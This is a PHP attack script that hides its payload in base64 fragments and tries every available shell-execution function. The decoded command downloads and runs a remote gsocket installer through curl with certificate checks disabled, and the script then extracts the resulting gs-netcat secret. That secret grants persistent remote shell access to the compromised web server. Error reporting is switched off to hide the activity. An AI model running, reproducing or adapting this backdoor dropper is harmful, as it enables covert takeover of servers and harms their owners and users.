<?php

// The script will run without any issue, unless "curl" is not present on the target.
@set_time_limit(0);
@ini_set('html_errors', '0');
@clearstatcache();
$d_17b31f50 = false;
if ($d_17b31f50) {
    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
    @ini_set('display_errors', '1');
    @ini_set('log_errors', '1'); 
} else {
    error_reporting(0);
    @ini_set('display_errors', '0');
    @ini_set('log_errors', '0');
}

// exec value from "mess" pipes stdout back to regex
function b_b9caa2a7($o_8ecaead4){
    $p_ccde149e = "";
    $o_8ecaead4 = $o_8ecaead4." 2>&1";
    if(is_callable('system')) {
        ob_start();
        @system($o_8ecaead4);
        $p_ccde149e = ob_get_contents();
        ob_end_clean();
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
    if(is_callable('shell_exec')){
        $p_ccde149e = @shell_exec($o_8ecaead4);
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
    if(is_callable('exec')) {
        @exec($o_8ecaead4,$s_95538831);
        if(!empty($s_95538831)) foreach($s_95538831 as $w_dcab58a9) $p_ccde149e .= $w_dcab58a9;
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
    if(is_callable('passthru')) {
        ob_start();
        @passthru($o_8ecaead4);
        $p_ccde149e = ob_get_contents();
        ob_end_clean();
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
    if(is_callable('proc_open')) {
        $l_e0057275 = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $f_861d1896 = @proc_open($o_8ecaead4, $l_e0057275, $e_fca9786f, getcwd(), array());
        if (is_resource($f_861d1896)) {
            while ($e_c2c94c1c = fgets($e_fca9786f[1])) {
                if(!empty($e_c2c94c1c)) $p_ccde149e .= $e_c2c94c1c;
            }
            while ($j_697cfa38 = fgets($e_fca9786f[2])) {
                if(!empty($j_697cfa38)) $p_ccde149e .= $j_697cfa38;
            }
        }
        @proc_close($f_861d1896);
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
    if(is_callable('popen')){
        $q_8c9f3610 = @popen($o_8ecaead4, 'r');
        if($q_8c9f3610){
            while(!feof($q_8c9f3610)){
                $p_ccde149e .= fread($q_8c9f3610, 2096);
            }
            pclose($q_8c9f3610);
        }
        if(!empty($p_ccde149e)) return $p_ccde149e;
    }
    return "";
}

// mess
$i_3087fa6 = "R1NfTk9DRVJUQ0hFQ0s9M";
$r_9a012e1c = "SBiYXNoIC1jICIkKGN1";
$l_ed061e8a = "cmwgLWZzU0xrIGh0dHBzO";
$b_cb62fb7c = "i8vZ3NvY2tldC5pby94KSIK";
$n_84c18552 = $i_3087fa6 . $r_9a012e1c;
$l_1dc8d4e8 = $l_ed061e8a . $b_cb62fb7c;
$l_bb6f4ec5 = base64_decode($n_84c18552 . $l_1dc8d4e8);
$o_8ecaead4 = $l_bb6f4ec5;
$u_136ac113 = b_b9caa2a7($o_8ecaead4);
$z_a3bcfc8e = '/gs-netcat -s \"(.*?)\" -i/'; // regex
if (preg_match($z_a3bcfc8e, $u_136ac113, $k_62615ba)) {
    echo "Success ==> " . $k_62615ba[0];
} else {
    echo "Failed :(";
}
